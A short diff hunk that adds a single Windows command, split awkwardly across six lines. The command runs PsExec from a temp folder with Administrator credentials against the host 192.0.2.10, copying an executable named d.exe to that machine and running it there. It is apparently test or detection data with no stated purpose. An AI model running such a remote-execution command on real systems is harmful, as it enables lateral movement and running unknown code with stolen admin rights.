@@ -1,0 +1,6 @@
+"C:\Windows\Temp
+\psexec.exe" "Administrator
+":"badpassword123
+"@"192.0.2.10
+" "-c d.exe
+"
